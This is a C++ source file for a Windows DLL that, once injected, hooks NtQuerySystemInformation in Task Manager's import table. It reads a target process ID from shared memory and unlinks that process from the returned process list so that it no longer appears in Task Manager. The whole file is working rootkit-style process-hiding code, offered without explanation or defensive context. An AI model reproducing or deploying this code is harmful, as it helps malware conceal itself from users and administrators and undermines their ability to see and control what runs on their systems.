// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "Process.hpp" 
#include "IATHooking.hpp"
#include "File.hpp"

constexpr char* TASK_MGR_EXE = "Taskmgr.exe";
constexpr char* HIDDEN_PID_NAME = "hidden_pid";
constexpr char* HOOK_FUNCTION = "NtQuerySystemInformation";

static IATHooking* g_NtQuerySystemInformation_hook;
static int g_hidden_pid;
typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

NTSTATUS __stdcall HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	auto status = reinterpret_cast<pNtQuerySystemInformation>(g_NtQuerySystemInformation_hook->get_original_function())(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
	{
		auto previous = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
		auto current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);

		while (previous->NextEntryOffset)
		{
			if ((int)(current->UniqueProcessId) == g_hidden_pid)
			{
				if (current->NextEntryOffset)
				{
					previous->NextEntryOffset += current->NextEntryOffset;
				}
				else
				{
					previous->NextEntryOffset = 0;
				}
			}

			previous = current;
			current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
		}
	}

	return status;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		g_hidden_pid = Process::read_global_memory(HIDDEN_PID_NAME);

		if (g_hidden_pid)
		{
			g_NtQuerySystemInformation_hook = new IATHooking(TASK_MGR_EXE, HOOK_FUNCTION, &HookedNtQuerySystemInformation);
		}

		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		if (g_NtQuerySystemInformation_hook)
		{
			delete g_NtQuerySystemInformation_hook;
		}
		break;
	}
	}

	return TRUE;
}